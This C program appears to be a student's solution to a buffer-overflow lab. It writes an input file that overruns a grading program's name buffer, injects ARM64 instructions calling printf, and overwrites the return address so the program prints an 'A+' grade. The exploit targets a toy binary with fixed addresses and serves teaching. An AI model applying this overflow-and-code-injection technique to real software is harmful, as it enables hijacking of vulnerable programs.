/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Tharun Kumar Tiruppali Kalidoss, Sarika Ahire              */
/*--------------------------------------------------------------------*/

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "miniassembler.h"


int main(void) {
    FILE* psFile;
    unsigned long ret;
    unsigned int mov;
    unsigned int adr;
    unsigned int strb;
    unsigned int b;
    unsigned int adrString;
    int i;
    char* name;
    char* formatString;
    
    name = "Sarika ";
    formatString = "A+ is your grade.\n";

    /* printf */
    ret = 4196440lu;


    /* 0x420060 = address of formatstring in data
       0x420074 = address of instruction in bss = (start of name[]) + 28 */
    adrString = MiniAssembler_adr(0,0x420061,0x420074);
    
    /* 0x40086c = address of printf(grade) 
       0x420078 = address of instruction in bss = (start of name[]) + 32 */
    b = MiniAssembler_b(0x40086c, 0x420078);

    psFile = fopen("dataAplus", "w");
    
    /* name from 0-6 */
    fprintf(psFile, "%s", name);

    /* null byte for name 7 */
    fprintf(psFile, "%c", '\0');

    /* printf format string 8-25*/
    fprintf(psFile, "%s", formatString);

    /* null byte for format string 26-27*/
    fprintf(psFile, "%c", '\0');
    fprintf(psFile, "%c", '\0');

    /* adrp x0, adr 28-31*/
    fwrite(&adrString, sizeof(unsigned int), 1, psFile);
    /* b printf from 32-35 */
    fwrite(&b, sizeof(unsigned int), 1, psFile);

    /* padding from 35-47 */
    for (i = 0; i < 12; i++)
        fprintf(psFile, "%c", '\0');

    fwrite(&ret, sizeof(unsigned long), 1, psFile);
    return 0;
}